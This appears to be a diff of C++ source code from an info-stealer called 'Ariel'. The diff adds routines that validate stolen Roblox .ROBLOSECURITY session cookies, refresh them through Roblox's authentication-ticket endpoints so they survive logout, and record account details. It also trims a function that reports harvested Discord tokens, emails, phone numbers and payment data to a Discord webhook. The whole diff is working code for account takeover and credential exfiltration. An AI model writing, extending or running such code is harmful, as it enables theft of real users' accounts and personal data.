@@ -167,6 +167,9 @@ struct http_response {
     bool ok = false;
     DWORD status = 0;
     std::string body;
+    std::string csrf;
+    std::string ticket;
+    std::string set_cookie;
 };
 
 http_response api_get(const std::string& path, const std::string& token) {
@@ -227,6 +230,198 @@ http_response api_get(const std::string& path, const std::string& token) {
     }
     failed.ok = status >= 200 && status < 300;
     return failed;
+}
+
+std::string header_safe(std::string value) {
+    for (char& c : value) {
+        if (c == '\r' || c == '\n') c = ' ';
+    }
+    return value;
+}
+
+http_response roblox_get(const std::string& cookie) {
+    http_response failed;
+    target destination;
+    if (!parse_url("https://users.roblox.com/v1/users/authenticated", destination)) return failed;
+
+    http_guard session(WinHttpOpen(L"ariel/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
+                                   WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0));
+    if (!session.handle) return failed;
+    http_guard connection(WinHttpConnect(session.handle, destination.host.c_str(),
+                                         destination.port, 0));
+    if (!connection.handle) return failed;
+    http_guard request(WinHttpOpenRequest(connection.handle, L"GET", destination.path.c_str(),
+                                          nullptr, WINHTTP_NO_REFERER,
+                                          WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE));
+    if (!request.handle) return failed;
+
+    const DWORD timeouts[4] = {5000, 5000, 10000, 15000};
+    WinHttpSetTimeouts(request.handle, timeouts[0], timeouts[1], timeouts[2], timeouts[3]);
+
+    const std::wstring header =
+        L"Cookie: .ROBLOSECURITY=" + util::from_utf8(header_safe(cookie));
+    WinHttpAddRequestHeaders(request.handle, header.c_str(), static_cast<DWORD>(header.size()),
+                             WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);
+    const std::wstring accept = L"Accept: application/json";
+    WinHttpAddRequestHeaders(request.handle, accept.c_str(),
+                             static_cast<DWORD>(accept.size()),
+                             WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);
+    const std::wstring user_agent = L"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)";
+    WinHttpAddRequestHeaders(request.handle, user_agent.c_str(),
+                             static_cast<DWORD>(user_agent.size()),
+                             WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);
+
+    if (!WinHttpSendRequest(request.handle, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
+                            WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) return failed;
+    if (!WinHttpReceiveResponse(request.handle, nullptr)) return failed;
+
+    DWORD status = 0;
+    DWORD status_size = sizeof(status);
+    WinHttpQueryHeaders(request.handle, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
+                        WINHTTP_HEADER_NAME_BY_INDEX, &status, &status_size,
+                        WINHTTP_NO_HEADER_INDEX);
+    failed.status = status;
+
+    constexpr size_t max_body = 64u * 1024u;
+    DWORD available = 0;
+    while (WinHttpQueryDataAvailable(request.handle, &available) && available > 0) {
+        if (failed.body.size() >= max_body) break;
+        const DWORD wanted = static_cast<DWORD>(
+            std::min<size_t>(available, max_body - failed.body.size()));
+        std::vector<char> buffer(wanted);
+        DWORD read = 0;
+        if (!WinHttpReadData(request.handle, buffer.data(), wanted, &read)) break;
+        failed.body.append(buffer.data(), read);
+    }
+    failed.ok = status >= 200 && status < 300;
+    return failed;
+}
+
+std::string query_header(const HINTERNET request,
+                         const DWORD level,
+                         const wchar_t* name = WINHTTP_HEADER_NAME_BY_INDEX) {
+    DWORD size = 0;
+    WinHttpQueryHeaders(request, level, name, nullptr, &size, WINHTTP_NO_HEADER_INDEX);
+    if (!size) return {};
+    std::vector<wchar_t> buffer(size / sizeof(wchar_t) + 1);
+    DWORD length = static_cast<DWORD>(buffer.size() * sizeof(wchar_t));
+    if (!WinHttpQueryHeaders(request, level, name, buffer.data(), &length,
+                             WINHTTP_NO_HEADER_INDEX))
+        return {};
+    return util::to_utf8(std::wstring(buffer.data(), length / sizeof(wchar_t)));
+}
+
+http_response roblox_post(
+    const std::string& path,
+    const std::string& cookie,
+    const std::vector<std::pair<std::wstring, std::wstring>>& headers,
+    const std::string& body) {
+    http_response failed;
+    target destination;
+    if (!parse_url("https://auth.roblox.com" + path, destination)) return failed;
+
+    http_guard session(WinHttpOpen(L"ariel/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
+                                   WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0));
+    if (!session.handle) return failed;
+    http_guard connection(WinHttpConnect(session.handle, destination.host.c_str(),
+                                         destination.port, 0));
+    if (!connection.handle) return failed;
+    http_guard request(WinHttpOpenRequest(connection.handle, L"POST", destination.path.c_str(),
+                                          nullptr, WINHTTP_NO_REFERER,
+                                          WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE));
+    if (!request.handle) return failed;
+
+    const DWORD timeouts[4] = {5000, 5000, 10000, 15000};
+    WinHttpSetTimeouts(request.handle, timeouts[0], timeouts[1], timeouts[2], timeouts[3]);
+
+    if (!cookie.empty()) {
+        const std::wstring header =
+            L"Cookie: .ROBLOSECURITY=" + util::from_utf8(header_safe(cookie));
+        WinHttpAddRequestHeaders(request.handle, header.c_str(),
+                                 static_cast<DWORD>(header.size()),
+                                 WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);
+    }
+    for (const auto& header : headers) {
+        const std::wstring line = header.first + L": " + header.second;
+        WinHttpAddRequestHeaders(request.handle, line.c_str(), static_cast<DWORD>(line.size()),
+                                 WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);
+    }
+    if (!body.empty()) {
+        const std::wstring content_type = L"Content-Type: application/json";
+        WinHttpAddRequestHeaders(request.handle, content_type.c_str(),
+                                 static_cast<DWORD>(content_type.size()),
+                                 WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);
+    }
+
+    if (!WinHttpSendRequest(request.handle, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
+                            body.empty() ? WINHTTP_NO_REQUEST_DATA
+                                         : const_cast<char*>(body.data()),
+                            static_cast<DWORD>(body.size()), 0, 0))
+        return failed;
+    if (!WinHttpReceiveResponse(request.handle, nullptr)) return failed;
+
+    DWORD status = 0;
+    DWORD status_size = sizeof(status);
+    WinHttpQueryHeaders(request.handle, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
+                        WINHTTP_HEADER_NAME_BY_INDEX, &status, &status_size,
+                        WINHTTP_NO_HEADER_INDEX);
+    failed.status = status;
+    failed.csrf = query_header(request.handle, WINHTTP_QUERY_CUSTOM, L"x-csrf-token");
+    failed.ticket =
+        query_header(request.handle, WINHTTP_QUERY_CUSTOM, L"rbx-authentication-ticket");
+    failed.set_cookie = query_header(request.handle, WINHTTP_QUERY_SET_COOKIE);
+
+    constexpr size_t max_body = 64u * 1024u;
+    DWORD available = 0;
+    while (WinHttpQueryDataAvailable(request.handle, &available) && available > 0) {
+        if (failed.body.size() >= max_body) break;
+        const DWORD wanted = static_cast<DWORD>(
+            std::min<size_t>(available, max_body - failed.body.size()));
+        std::vector<char> buffer(wanted);
+        DWORD read = 0;
+        if (!WinHttpReadData(request.handle, buffer.data(), wanted, &read)) break;
+        failed.body.append(buffer.data(), read);
+    }
+    failed.ok = status >= 200 && status < 300;
+    return failed;
+}
+
+std::string http_status(const http_response& response);
+
+std::string refresh_roblox_cookie(const std::string& cookie, std::string& error) {
+    error.clear();
+    const auto logout = roblox_post("/v2/logout", cookie, {}, {});
+    if (logout.csrf.empty()) {
+        error = "csrf: " + http_status(logout);
+        return {};
+    }
+
+    const std::vector<std::pair<std::wstring, std::wstring>> ticket_headers = {
+        {L"rbxauthenticationnegotiation", L"1"},
+        {L"referer", L"https://www.roblox.com/camel"},
+        {L"x-csrf-token", util::from_utf8(logout.csrf)},
+    };
+    const auto ticket = roblox_post("/v1/authentication-ticket", cookie, ticket_headers, {});
+    if (ticket.ticket.empty()) {
+        error = "ticket: " + http_status(ticket);
+        return {};
+    }
+
+    const std::vector<std::pair<std::wstring, std::wstring>> redeem_headers = {
+        {L"rbxauthenticationnegotiation", L"1"},
+    };
+    const std::string body =
+        "{\"authenticationTicket\":\"" + json_escape(ticket.ticket) + "\"}";
+    const auto redeem = roblox_post("/v1/authentication-ticket/redeem", "", redeem_headers, body);
+    const auto marker = redeem.set_cookie.find(".ROBLOSECURITY=");
+    if (marker == std::string::npos) {
+        error = "redeem: " + http_status(redeem);
+        return {};
+    }
+    const auto start = marker + std::string(".ROBLOSECURITY=").size();
+    const auto end = redeem.set_cookie.find(';', start);
+    return redeem.set_cookie.substr(
+        start, end == std::string::npos ? std::string::npos : end - start);
 }
 
 std::string http_status(const http_response& response) {
@@ -451,6 +646,53 @@ std::vector<discord_account> inspect_discord_tokens(
     return out;
 }
 
+std::vector<roblox_account> inspect_roblox_cookies(
+    const std::vector<roblox_cookie_input>& cookies) {
+    std::vector<roblox_account> out;
+    out.reserve(cookies.size());
+    for (const auto& input : cookies) {
+        roblox_account account;
+        account.source = input.source;
+        account.profile = input.profile;
+        account.cookie = input.cookie;
+        account.source_cookie = input.cookie;
+
+        std::string refresh_error;
+        const std::string refreshed = refresh_roblox_cookie(input.cookie, refresh_error);
+        if (!refreshed.empty()) {
+            const auto response = roblox_get(refreshed);
+            if (response.ok) {
+                account.valid = true;
+                account.refreshed = true;
+                account.cookie = refreshed;
+                account.id = std::to_string(json_integer(response.body, "id"));
+                account.username = json_value(response.body, "name");
+                account.display_name = json_value(response.body, "displayName");
+            } else {
+                account.error = "refreshed but " + http_status(response);
+            }
+        }
+
+        if (!account.valid) {
+            const auto response = roblox_get(input.cookie);
+            if (response.ok) {
+                account.valid = true;
+                account.id = std::to_string(json_integer(response.body, "id"));
+                account.username = json_value(response.body, "name");
+                account.display_name = json_value(response.body, "displayName");
+                account.error.clear();
+            } else if (response.status == 401 || response.status == 403) {
+                account.error = "invalid or ip locked";
+            } else {
+                account.error = http_status(response);
+            }
+            if (!account.valid && account.error.empty()) account.error = refresh_error;
+        }
+        out.push_back(account);
+    }
+    return out;
+}
+
 std::string describe_account(const discord_account& account, const bool full_token) {
     std::string out;
     const auto line = [&](const char* name, const std::string& value) {
@@ -523,16 +765,6 @@ result send_discord(const std::string& webhook_url,
         return std::string("{\"name\":\"") + json_escape(name) + "\",\"value\":\"" +
                json_escape(value) + "\",\"inline\":" + (inline_field ? "true" : "false") + "}";
     };
-    const auto code_block = [](std::string value) {
-        std::replace(value.begin(), value.end(), '`', '\'');
-        if (value.size() > 940) value.resize(940);
-        return std::string("```text\n") + text_value(value) + "\n```";
-    };
-    const auto inline_code = [](std::string value) {
-        std::replace(value.begin(), value.end(), '`', '\'');
-        if (value.size() > 900) value.resize(900);
-        return std::string("`") + text_value(value) + "`";
-    };
     const auto make_embed = [&](const std::string& title,
                                 const std::string& embed_description,
                                 const std::string& fields,
@@ -558,15 +790,9 @@ result send_discord(const std::string& webhook_url,
     };
 
     size_t valid_accounts = 0;
-    size_t invalid_accounts = 0;
     for (const auto& account : report.accounts) {
-        if (account.valid)
-            ++valid_accounts;
-        else
-            ++invalid_accounts;
+        if (account.valid) ++valid_accounts;
     }
-    if (report.tokens && !valid_accounts && !invalid_accounts)
-        invalid_accounts = report.tokens;
 
     std::vector<std::string> base_fields;
     base_fields.push_back(field_json("User", report.user, true));
@@ -594,77 +820,6 @@ result send_discord(const std::string& webhook_url,
 
     std::vector<std::string> embeds;
     embeds.push_back(make_embed("Ariel", description, join_fields(base_fields), logo, image));
-
-    size_t account_number = 1;
-    for (const auto& account : report.accounts) {
-        if (!account.valid) continue;
-        const std::string title = "Discord account " + std::to_string(account_number++);
-        const std::string thumbnail_url = account.avatar_url.empty() ? logo : account.avatar_url;
-
-        std::string user = account.username;
-        if (!account.discriminator.empty() && account.discriminator != "0")
-            user += "#" + account.discriminator;
-        if (!account.global_name.empty() && account.global_name != user)
-            user += " (" + account.global_name + ")";
-        char accent[16]{};
-        std::snprintf(accent, sizeof(accent), "#%06X",
-                      static_cast<unsigned>(account.accent_color) & 0xFFFFFFu);
-
-        std::vector<std::string> fields;
-        fields.push_back(field_json("Token", code_block(account.token), false));
-        fields.push_back(field_json("Email", inline_code(account.email), true));
-        fields.push_back(field_json("Phone", inline_code(account.phone), true));
-        fields.push_back(field_json("User", inline_code(user), true));
-        fields.push_back(field_json("ID", inline_code(account.id), true));
-        fields.push_back(field_json("Nitro", inline_code(nitro_text(account.premium_type)), true));
-        fields.push_back(field_json("Locale", inline_code(account.locale), true));
-        fields.push_back(field_json("Created", inline_code(account.created), true));
-        fields.push_back(field_json("Verified", inline_code(account.verified ? "yes" : "no"), true));
-        fields.push_back(field_json("MFA", inline_code(account.mfa_enabled ? "yes" : "no"), true));
-        if (account.accent_color > 0)
-            fields.push_back(field_json("Accent color", inline_code(accent), true));
-        fields.push_back(field_json("Badges", inline_code(account.badges), true));
-        fields.push_back(field_json("Flags", inline_code(
-            std::to_string(account.flags ? account.flags : account.public_flags)), true));
-        fields.push_back(field_json("Avatar", code_block(account.avatar_url), false));
-        fields.push_back(field_json("Banner", code_block(account.banner_url), false));
-        fields.push_back(field_json("Guilds (" + std::to_string(account.guild_count) + ")",
-                                    code_block(account.guilds), false));
-        fields.push_back(field_json("Friends (" + std::to_string(account.friend_count) + ")",
-                                    code_block(account.friends), false));
-        fields.push_back(field_json("Payment", code_block(account.payment), false));
-        fields.push_back(field_json("Subscriptions", code_block(account.subscriptions), false));
-        fields.push_back(field_json("Source", code_block(account.source), false));
-        if (!account.error.empty())
-            fields.push_back(field_json("Notes", code_block(util::trim(account.error)), false));
-
-        const size_t chunk_size = 10;
-        for (size_t i = 0; i < fields.size(); i += chunk_size) {
-            const size_t end = std::min(i + chunk_size, fields.size());
-            const std::vector<std::string> chunk(fields.begin() + i, fields.begin() + end);
-            const std::string part = end == fields.size()
-                                         ? ""
-                                         : " (" + std::to_string(i / chunk_size + 1) + ")";
-            const std::string detail = i == 0 ? "Checked Discord account"
-                                              : "Discord account details continued";
-            embeds.push_back(make_embed("Ariel - " + title + part, detail,
-                                        join_fields(chunk), thumbnail_url, "", 0xb143e3));
-        }
-    }
-
-    if (invalid_accounts) {
-        std::string invalid_details;
-        for (const auto& account : report.accounts) {
-            if (account.valid) continue;
-            if (invalid_details.size() > 900) break;
-            invalid_details += text_value(account.source) + " " + text_value(account.error) + "\n";
-        }
-        if (invalid_details.empty())
-            invalid_details = std::to_string(invalid_accounts) + " tokens could not be checked";
-        embeds.push_back(make_embed("Ariel - Invalid tokens", "Token check results",
-                                    field_json("Invalid tokens", code_block(invalid_details), false),
-                                    logo, ""));
-    }
 
     std::string combined_detail;
     for (size_t i = 0; i < embeds.size(); ++i) {
